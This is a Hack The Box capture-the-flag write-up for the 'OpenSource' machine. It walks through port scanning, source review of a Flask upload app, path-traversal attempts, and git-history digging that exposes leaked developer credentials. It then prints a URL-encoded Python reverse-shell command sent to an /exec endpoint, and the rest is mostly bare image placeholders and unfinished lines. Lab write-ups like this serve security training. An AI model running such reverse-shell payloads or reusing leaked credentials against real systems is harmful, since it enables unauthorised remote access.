# Open Source - Writeup

**Date**: 24/05/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/OpenSource](https://app.hackthebox.com/machines/OpenSource)

---

Let’s start with a ping

![Untitled](images/Untitled.png)

`ttl=63` so we are probably facing a Linux machine.

Let’s do a nmap port scan:

![Untitled](images/Untitled%201.png)

The TCP ports 22 and 80 are open, ssh and http, and there is a port (3000) that appears as filtered. Let’s do a detailed scan to try to obtain the services and their versions:

![Untitled](images/Untitled%202.png)

![Untitled](images/Untitled%203.png)

While the previous scan was taking place (it took around 2 minutes) I launched a whatweb scan to scan the website hosted in the port 80:

![Untitled](images/Untitled%204.png)

The OpenSSH build version is `7.6p1 Ubuntu 4ubuntu0.7` 

![Untitled](images/Untitled%205.png)

According to launchpad, the target machine should be an Ubuntu Bionic.

The web server is something called Werkzeug… let’s investigate about it:

[https://werkzeug.palletsprojects.com/en/2.1.x/](https://werkzeug.palletsprojects.com/en/2.1.x/)

![Untitled](images/Untitled%206.png)

> WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.
> 

Let’s see how it looks in the web-browser:

![Untitled](images/Untitled%207.png)

Every link redirects to # except the buttons Download and Take me there:

![Untitled](images/Untitled%208.png)

Let’s click on Download first:

![Untitled](images/Untitled%209.png)

It starts the download of a compressed file that contains what it seems to be the source code of the upcloud software.

 Now, let’s click on the button Take me there!:

![Untitled](images/Untitled%2010.png)

Let’s upload something:

![Untitled](images/Untitled%2011.png)

![Untitled](images/Untitled%2012.png)

Sooo… it uploaded the file to the target server and then shows you the url to view the file. Nice. It will not be that easy, but let’s try to upload a php-reverse-shell.php…

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

Hahahaha no, instead of interpret the php file it send it to us for download.

At this point, we have the source code of the application, so let’s try to see how it works and if there is any vulnerability we can exploit:

![Untitled](images/Untitled%2015.png)

![Untitled](images/Untitled%2016.png)

[Utils.py](http://Utils.py) code contains interesting stuff. There are several functions that try to sanitize the filename of the file we will try to upload.

```python
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

The function `recursive_replace` is self-explained. It takes 3 arguments:

- `search`: String that will be sanitized
- `replace_me` : String that will be replaced
- `with_me` : String that will replace the previous one

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```

The function `get_file_name` gets the input `unsafe_filename` and replaces every `../` with nothing using the `recursive_replace` function.

```python
def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
```

This function gets the input `unsafe_filename` and does 2 things.

1. It splits the input using the most right `.` character
2. Then it sanitizes the filename (but not the extension) and concatenate both including between a string representing the current milliseconds)

 

```python
"""
TODO: get unique filename
"""
```

There is a comment about a feature that has not been developed yet. Maybe we can use this later… Maybe we can cause something if we try to upload 2 files with the same filename?

![Untitled](images/Untitled%2017.png)

The [views.py](http://views.py) file has functions related to the file upload process:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```

Ok, if we could name our file something like “../../../../../etc/passwd” the render template should return the passwd file due to directory traversal vulnerability. But the file name is being sanitized, replacing the “../” recursively with a blank string. Maybe we can find other string which can do the same function as “../../../../” (I don’t really know if it exists).

But first, let’s see what happens when we try to upload the same file twice (due to the TODO task), so we will upload the same file again, but changing it’s content. Previously the content of text.txt was “Hello world”, this time will be “Test”.

![Untitled](images/Untitled%2018.png)

![Untitled](images/Untitled%2019.png)

Interesting, the upload overwrites the previous file.

Ok, let’s use Burpsuite to try to manipulate the upload. I intercepted an Upload request and send it to the repeater:

![Untitled](images/Untitled%2020.png)

It didn’t work well…

After MANY hours trying to bypass the sanitization of the recursive replacement function in get_name… I started from other aproach:

If we list all files we downloaded:

![Untitled](images/Untitled%2021.png)

We can see the .git folder, which indicates us that is a git repository. Let’s enumerate it!

First, let’s see if there are several branches:

![Untitled](images/Untitled%2022.png)

Yep, we are in the public branch, but there is another one called dev, so we switched to it. Let’s read the logs:

![Untitled](images/Untitled%2023.png)

There are some commits. Let’s see the difference between them:

![Untitled](images/Untitled%2024.png)

Between the “ease testing” and “added gitignore”, there is nothing interesting.

![Untitled](images/Untitled%2025.png)

![Untitled](images/Untitled%2026.png)

But, between “ease testing” and “updated” there is a strange url with something that looks like credentials in a file called “settings.json” inside the .vscode folder.

```python
"python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
```

`dev01:Soulless_Developer#2022`

Let’s 

![Untitled](images/Untitled%2027.png)

![Untitled](images/Untitled%2028.png)

`http://10.10.11.164/exec?cmd=ping%20-c%201%2010.10.14.198`

![Untitled](images/Untitled%2029.png)

`10.10.11.164/exec?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.14.198%22%2C1234))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2Fbin%2Fsh%22%2C%22-i%22])%3B%27%0A`

![Untitled](images/Untitled%2030.png)

![Untitled](images/Untitled%2031.png)

![Untitled](images/Untitled%2032.png)

![Untitled](images/Untitled%2033.png)

![Untitled](images/Untitled%2034.png)

![Untitled](images/Untitled%2035.png)

![Untitled](images/Untitled%2036.png)

![Untitled](images/Untitled%2037.png)

![Untitled](images/Untitled%2038.png)

![Untitled](images/Untitled%2039.png)

![Untitled](images/Untitled%2040.png)

![Untitled](images/Untitled%2041.png)

![Untitled](images/Untitled%2042.png)

![Untitled](images/Untitled%2043.png)

![Untitled](images/Untitled%2044.png)

![Untitled](images/Untitled%2045.png)

![Untitled](images/Untitled%2046.png)

![Untitled](images/Untitled%2047.png)

![Untitled](images/Untitled%2048.png)

![Untitled](images/Untitled%2049.png)

![Untitled](images/Untitled%2050.png)

![Untitled](images/Untitled%2051.png)

![Untitled](images/Untitled%2052.png)

![Untitled](images/Untitled%2053.png)

psp

![Untitled](images/Untitled%2054.png)

![Untitled](images/Untitled%2055.png)

![Untitled](images/Untitled%2056.png)

![Untitled](images/Untitled%2057.png)